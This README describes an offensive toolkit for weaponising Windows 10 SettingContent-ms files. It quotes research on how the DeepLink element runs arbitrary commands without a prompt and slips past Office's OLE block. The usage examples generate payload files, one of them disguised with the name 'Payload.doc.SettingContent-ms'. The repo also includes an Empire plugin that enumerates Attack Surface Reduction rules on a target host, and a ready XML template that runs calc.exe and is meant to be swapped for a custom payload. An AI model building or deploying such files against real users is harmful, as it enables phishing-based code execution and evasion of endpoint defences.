# SettingContent-ms Tools

A small group of scripts to help with creation of SettingContent-ms files for code execution. Includes an XML template for a SettingContent-ms file that executes calc.exe.

## Background
Because there's no sense reinventing the wheel, I'm just going to quote [enigma0x3](http://test.com/test) on this topic:

```Text
This format was introduced in Windows 10 and allows a user to create “shortcuts” to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.

...

All this file does is open the Control Panel for the user. The interesting aspect of this file is the <DeepLink> element in the schema. This element takes any binary with parameters and executes it.

...

What is interesting is that when double-clicking the file, there is no “open” prompt. Windows goes straight to executing the command.

...

When this file comes straight from the internet, it executes as soon as the user clicks “open”. Looking at the streams of the file, you will notice that it does indeed grab Mark-Of-The-Web. When looking up the ZoneIds online, “3” equals “URLZONE_INTERNET”. For one reason or another, the file still executes without any notification or warning to the user.

...

Office 2016 blocks a preset list of “known bad” file types when embedded with Object Linking and Embedding. The SettingContent-ms file format, however, is not included in that list. At this point, we can evade the Office 2016 OLE file extension block by embedding a malicious .SettingContent-ms file via OLE. When a document comes from the internet with a .SettingContent-ms file embedded in it, the only thing the user sees is the “Open Package Contents” prompt. Clicking “Open” will result in execution. If an environment doesn’t have any Attack Surface Reduction rules enabled, this is all an attacker needs to execute code on the endpoint.
```

This is about the gist of what you need to take advantage of this file format. For more information, I encourage you to consult [enigma0x3's blog post regarding SettingContent-ms](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39).

## Contents

### Find-ASRRuleDescription.ps1
Find the definition of a given Attack Surface Reduction rule.

```PowerShell
Find-ASRRuleDescription -GUID "{D3E037E1-3EB8-44C8-A917-57927947596D}"
```

```PowerShell
Get-MpPreference | Select AttackSurfaceReductionRules_IDs | Find-ASRRuleDescription
```

### Get-ASRRules.py
Empire PowerShell plugin that gets the _definitions_ of the Attack Surface Reduction rules that are enabled on the target host. Requires Get-MpPreference cmdlet which is only present on Windows 10 (Powershell 5).

### New-SettingContentMSFile.ps1
Create a new SettingContent-ms file with a custom command payload.

```PowerShell
New-SettingContentMSFile -Command '%windir%\system32\cmd.exe /c calc.exe' -FileName 'Payload.doc.SettingContent-ms'
```

```PowerShell
New-SettingContentMSFile -Command '%windir%\system32\cmd.exe /c calc.exe'
```

### Template.SettingContent-ms
A SettingContent-ms file template that launches calc.exe upon execution. To launch custom payload, change the contents of the <DeepLink> tags to your payload.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
    <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
        <ApplicationInformation>
            <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
            <DeepLink>%windir%\system32\cmd.exe /c calc.exe</DeepLink>
            <Icon>%windir%\system32\control.exe</Icon>
        </ApplicationInformation>
        <SettingIdentity>
            <PageID></PageID>
            <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
        </SettingIdentity>
        <SettingInformation>
            <Description>@shell32.dll,-4161</Description>
            <Keywords>@shell32.dll,-4161</Keywords>
        </SettingInformation>
    </SearchableContent>
</PCSettings>
```

## Related Links & References
- [https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39)
- [https://twitter.com/enigma0x3/status/1006516077176721408](https://twitter.com/enigma0x3/status/1006516077176721408)
- [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard)
- [https://github.com/danielbohannon/Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
